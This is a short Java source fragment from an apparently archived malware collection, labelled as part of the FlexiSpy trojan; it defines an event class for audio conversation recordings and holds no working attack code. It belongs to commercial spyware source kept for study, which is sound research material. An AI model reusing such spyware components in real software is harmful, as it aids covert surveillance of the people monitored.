/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.event;

public class AudioConvEvent extends EmbeddedCallInfo {
	
	public EventType getEventType() {
		return EventType.AUDIO_CONVER;
	}
 
}
